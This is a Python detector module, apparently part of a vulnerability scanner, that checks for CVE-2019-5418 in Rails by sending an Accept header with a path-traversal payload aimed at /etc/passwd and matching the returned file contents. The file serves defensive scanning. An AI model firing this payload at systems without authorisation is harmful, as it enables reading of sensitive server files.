"""CVE-2019-5418 - Rails Action View file content disclosure."""
from .base import CVEDetector, CVEResult


class RailsAccept(CVEDetector):
    cve_id = "CVE-2019-5418"
    title = "Rails Action View File Content Disclosure via Accept header"
    severity = "critical"
    affected = "Rails 4.2.x < 4.2.11.1 / 5.0 < 5.0.7.2 / 5.1 < 5.1.6.2 / 5.2 < 5.2.2.1 / 6.0.0.beta3"
    tags = ["cve-2019-5418", "rails", "file-disclosure"]

    def probe(self, base, baseline_body):
        header = "Accept: ../../../../../../../../etc/passwd{{"
        args = ["-H", header]
        status, body = self._get(base + "/", timeout=8, extra_args=args)
        if not body:
            return None
        if "root:x:0:0" in body and "root:x:0:0" not in baseline_body:
            return CVEResult(
                vulnerable=True,
                url=base + "/",
                evidence="Accept header traversal returned /etc/passwd content",
                detail="Rails Action View renders arbitrary files via crafted Accept header.",
            )
        return None
